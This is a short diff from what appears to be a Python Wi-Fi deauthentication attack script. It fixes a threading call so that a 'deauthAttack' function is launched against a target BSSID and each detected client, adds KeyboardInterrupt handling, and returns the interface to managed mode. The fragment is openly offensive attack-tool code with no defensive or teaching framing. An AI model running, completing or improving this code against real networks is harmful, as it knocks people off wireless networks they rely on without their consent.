@@ -200,4 +200,9 @@ try:
                 print(f"{item}")
                 if item not in threadsStarted:
                     threadsStarted.append(item)
-                    t = threading.Thread(target=deauthAttack, )
+                    t = threading.Thread(target=deauthAttack, args=[hackBssid, item, wifiName], daemon=True)
+                    t.start()
+except KeyboardInterrupt:
+    print("\n Stopping Deauth")
+    
+setIntoManagedMode(wifiName)
